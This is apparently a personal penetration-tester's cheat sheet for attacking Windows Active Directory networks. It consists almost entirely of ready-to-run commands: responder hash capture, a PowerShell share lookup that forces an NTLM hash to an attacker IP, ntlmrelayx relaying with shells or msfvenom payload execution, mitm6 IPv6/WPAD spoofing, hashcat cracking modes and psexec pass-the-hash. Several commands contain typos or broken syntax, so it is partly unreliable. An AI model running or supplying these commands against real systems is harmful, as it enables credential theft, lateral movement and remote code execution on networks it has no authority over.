# responder.py
sudo responder -I eth0 -dwv



for SMB Relay 
disable responding on smb and http edit /usr/share/responder/Responderr.conf

## on windows
you can get user ntlm hash after getting reverse shell on a target using responder and sending gci command 
```powershell

sudo responder -I eth0
gci \\10.10.10.10\test\test

```
## ntlmrelayx.py
ntlmrelayx.py -tf targets.txt -smb2support
-i for interactive shell
-e to execute a file (msfvenom rev shell etc.)
-c command (e.g. whoami)
-6 for IPv6
-t target 
-l loot
IPv6 ldaps attack e.g. ntlmrelayx.py -6 -t ldaps://IP -wh (for wpad) fakewpad.marvel.local -l lootme


### nmap check
nmap script to check for smb signing disabled
nmap --script =smb2-security-mode.nse p445 IP/RANGE


# hashcat
hashcat -m # hash code -a ATTACKTYPE 0 or empty hashfile wordlist 
NTLM 1000
NTLMv2 5600



# psexec.py or metasploit #passhash
    used for: 
	    1- passing hashes
		2- creates a remote service by uploading a randomly-named executable to the hidden Windows ADMIN$ share, registering a service via RPC and the Windows Service Control Manager, and then communicating over named a named pipe
	usage 1 : 
	    psexec.py USUERNAME:@IP -hashes HASH
	usage 2 :
	  psexec.py SHARE/ADMIN_ACCOUNT:"PASSWORD\!"@IP
	usage 3 :
      psexec.py DOMAIN/USERNAME:PASSWORD@IP 

More tools like psexec :

*Less noisy start with these smbexec/wmiexec*

# mitm6
```
mimt6 -d DOMAIN
```
then start relay attack using ntlmrelayx.py

```
ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.DOMAIN -l loot
```